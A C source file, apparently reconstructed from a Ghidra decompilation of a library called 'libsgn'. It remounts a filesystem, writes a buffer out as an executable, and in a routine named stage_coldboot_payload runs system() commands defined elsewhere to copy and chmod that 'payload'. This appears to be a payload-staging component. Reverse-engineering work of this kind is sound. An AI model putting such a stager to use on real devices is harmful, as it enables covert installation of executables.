/*
 * libsgn filesystem staging
 * Ghidra: remount_filesystem @ 0x0000211c
 *         write_buffer_as_executable @ 0x0000225c
 *         file_exists @ 0x000022b0
 */

#include "fs_stage.h"
#include "strings.h"

#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>

#ifndef MS_REMOUNT
#define MS_REMOUNT 0x20
#endif
#ifndef MS_NOATIME
#define MS_NOATIME 0x400
#endif

/* listing ORs caller flags with 0x420 (MS_REMOUNT | MS_NOATIME) */
#define LIBSGN_REMOUNT_OR  (MS_REMOUNT | MS_NOATIME)

int remount_filesystem(const char *mount_path, unsigned extra_flags)
{
    FILE *fp;
    char line[1024];
    size_t want;
    int ok = 0;

    if (!mount_path)
        return 0;
    want = strlen(mount_path);

    fp = fopen(LIBSGN_PROC_MOUNTS, "r");
    if (!fp)
        return 0;

    while (fgets(line, sizeof(line), fp)) {
        char *dev;
        char *dir;
        char *type;
        char *p;
        char *sp1;
        char *sp2;

        if (line[0] == '\0' || line[strlen(line) - 1] != '\n') {
            int c;
            while ((c = fgetc(fp)) != EOF && c != '\n')
                ;
            continue;
        }

        sp1 = strchr(line, ' ');
        if (!sp1)
            continue;
        *sp1 = '\0';
        p = sp1 + 1;
        sp2 = strchr(p, ' ');
        if (!sp2)
            continue;
        *sp2 = '\0';
        dir = p;
        p = sp2 + 1;
        sp1 = strchr(p, ' ');
        if (!sp1)
            continue;
        *sp1 = '\0';
        type = p;
        dev = line;

        if (strlen(dir) != want || memcmp(mount_path, dir, want) != 0)
            continue;

        ok = mount(dev, dir, type, extra_flags | LIBSGN_REMOUNT_OR, NULL) == 0;
        break;
    }
    fclose(fp);
    return ok;
}

int write_buffer_as_executable(const void *buf, size_t len, const char *path)
{
    FILE *fp;
    size_t n;
    int ok = 0;

    if (!buf || !path)
        return 0;

    unlink(path);
    fp = fopen(path, "wb");
    if (!fp)
        return 0;
    n = fwrite(buf, 1, len, fp);
    if (n == len)
        ok = chmod(path, LIBSGN_EXEC_MODE) == 0;
    fclose(fp);
    return ok;
}

int file_exists(const char *path, int *out_exists)
{
    struct stat st;

    if (!path || !out_exists)
        return 0;
    *out_exists = 0;
    memset(&st, 0, sizeof(st));
    errno = 0;
    if (stat(path, &st) == 0) {
        *out_exists = 1;
        return 1;
    }
    return errno == ENOENT;
}

int stage_coldboot_payload(const void *buf, size_t len)
{
    int exists = 0;

    if (!file_exists(LIBSGN_CSK_PATH, &exists))
        return 0;

    if (!exists)
        return write_buffer_as_executable(buf, len, LIBSGN_APP_COLDBOOT);

    if (!write_buffer_as_executable(buf, len, LIBSGN_APP_COLDBOOT))
        return 0;
    remount_filesystem(LIBSGN_OBB_MOUNT, 0);
    if (system(LIBSGN_CSK_CAT) == -1)
        return 0;
    if (system(LIBSGN_CSK_CHMOD) == -1)
        return 0;
    unlink(LIBSGN_APP_COLDBOOT);
    return 1;
}
